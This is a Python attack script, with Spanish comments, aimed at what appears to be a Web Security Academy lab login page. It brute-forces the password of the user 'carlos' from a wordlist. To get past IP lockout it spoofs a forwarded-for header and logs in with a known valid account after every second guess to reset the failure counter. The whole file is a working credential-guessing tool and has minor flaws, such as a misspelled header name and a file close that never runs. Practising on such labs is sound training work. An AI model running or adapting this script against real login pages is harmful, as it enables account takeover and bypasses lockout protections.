import requests, signal, sys, string, time
from pwn import *

# Variables globales
URL = "https://0ad700f904605c43c327f180003a005c.web-security-academy.net/login"

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)


def makeRequest(payload, num):
    data_post = {
        'username':'carlos',
        'password': '%s' % payload
    }
    header = {"Cookie": "session=tTHYJvKdl5rX453QGYBT3YBkSH1Bu80Q", "X-Forwarder-For": "%d" % num, "Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(URL, data=data_post, headers=header)
    return r

if __name__ == "__main__":
    p1 = log.progress("Iniciando proceso de fuerza bruta")
    p2 = log.progress("Probando con contraseña")
    p3 = log.progress("Contraseña correcta")

    f = open("/home/darkarneus/Desktop/pass.txt", "r")
    num = 0
    for i in f.readlines():
        num += 1
        # Cada 2 logins me loggearé con una cuenta que existe para que no me bloqueen la ip
        if num%2 == 0:
            requests.post(URL, data={'username': 'wiener', 'password': 'peter'}, headers={"Cookie": "session=tTHYJvKdl5rX453QGYBT3YBkSH1Bu80Q", "X-Forwarder-For": "%d" % num, "Content-Type": "application/x-www-form-urlencoded"})
            num += 1
        payload = i.strip()
        r = makeRequest(payload, num)
        p2.status(i)
        if "Incorrect password" not in r.text:
            p3.status(i)
            sys.exit()
            f.close()

